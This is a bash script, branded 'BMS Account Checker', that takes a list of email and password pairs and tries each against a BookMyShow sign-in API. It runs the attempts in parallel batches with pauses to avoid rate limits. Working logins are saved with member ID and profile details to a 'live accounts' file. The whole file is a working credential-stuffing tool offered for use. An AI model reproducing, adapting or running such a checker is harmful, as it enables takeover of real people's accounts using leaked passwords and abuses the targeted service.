#!/bin/bash
# CCOCOT.CO

cat << "EOF"
	 ____   ____ ___  ____  _____   _   _ _____ _____ 
	| __ ) / ___/ _ \|  _ \| ____| | \ | | ____|_   _|
	|  _ \| |  | | | | | | |  _|   |  \| |  _|   | |  
	| |_) | |__| |_| | |_| | |___ _| |\  | |___  | |  
	|____/ \____\___/|____/|_____(_)_| \_|_____| |_|  

		BMS Account Checker
		Auto Gentod JUANCOK !1!1!1!

EOF


ngecek(){
	local CY='\e[36m'
	local GR='\e[34m'
	local OG='\e[92m'
	local WH='\e[37m'
	local RD='\e[31m'
	local YL='\e[33m'
	local BF='\e[34m'
	local DF='\e[39m'
	local OR='\e[33m'
	local PP='\e[35m'
	local B='\e[1m'
	local CC='\e[0m'
	local ngecurl=$(curl -s services-id.bookmyshow.com/doTrans.aspx -d "strAppCode=INDOMOBAND&strParam1=${1}&strFormat=json&strParam2=${2}&strCommand=SIGNIN")
	local status=$(echo $ngecurl | grep -Po '(?<=blnSuccess":")[^"]*')
	if [[ $status == "true" ]]; then
		local MEMBERID=$(echo $ngecurl | grep -Po '(?<=MEMBERID":")[^"]*')
		local ISPROFILECOMPLETE=$(echo $ngecurl | grep -Po '(?<=ISPROFILECOMPLETE":")[^"]*')
		local EMAILVERIFIED=$(echo $ngecurl | grep -Po '(?<=EMAILVERIFIED":")[^"]*')
		printf "${B}${GR}LIVE${CC} | ${1}-${2} => [${YL}MEMBERID: ${MEMBERID}${CC}] [${YL}ISPROFILECOMPLETE: ${ISPROFILECOMPLETE}${CC}] [${YL}EMAILVERIFIED: ${EMAILVERIFIED}${CC}] \n"
		echo "${1}|${2} => [MEMBERID: ${MEMBERID}] [ISPROFILECOMPLETE: ${ISPROFILECOMPLETE}] [EMAILVERIFIED: ${EMAILVERIFIED}]" >> BMSLiveAccount.txt
	elif [[ $status == "false" ]]; then
		# local ERRMSG=$(echo $ngecurl | grep -Po '(?<=strException":")[^"]*')
		printf "${B}${RD}DIE${CC} | ${1}-${2} \n"
		echo "${1}|${2}" >> BMSDieAccount.txt
	else
		printf "${B}${CY}UNK${CC} | ${1}-${2} \n"
		echo "${1}|${2}" >> BMSUnkAccount.txt
	fi
}

if [[ -z $1 ]]; then
	header
	printf "To Use $0 <mailist.txt> \n"
	exit 1
fi

# SET RATIO
persend=10
setleep=5

IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))'
itung=1

for (( i = 0; i < ${#mailist[@]}; i++ )); do
	username="${mailist[$i]}"
	IFS='|' read -r -a array <<< "$username"
	email=${array[0]}
	password=${array[1]}
	set_kirik=$(expr $itung % $persend)
    if [[ $set_kirik == 0 && $itung > 0 ]]; then
        sleep $setleep
    fi
    ngecek "${email}" "${password}" &
    itung=$[$itung+1]
done
wait